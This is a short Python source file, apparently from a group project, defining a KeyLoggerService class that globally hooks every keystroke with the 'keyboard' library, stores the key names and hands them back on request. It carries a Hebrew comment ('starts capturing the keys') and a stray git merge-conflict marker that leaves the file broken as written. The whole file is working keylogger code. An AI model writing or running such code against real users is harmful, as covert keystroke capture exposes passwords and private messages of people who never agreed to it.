import keyboard
class KeyLoggerService:
    def __init__(self):
        self.flag = False
        self.keys = []

    def on_key_event(self, event):
        self.keys.append(event.name)

    def start_logging(self)-> None:
        keyboard.hook(self.on_key_event)

    def stop_logging(self):
        keyboard.unhook_all()


    def get_logged_keys(self) -> list:
        requested_keys = self.keys
        self.keys = []
        return requested_keys
# מתחיל ללכוד את המקשים
>>>>>>> dermer-1

# start_logging()
# stop_logging()
# get_logged_keys()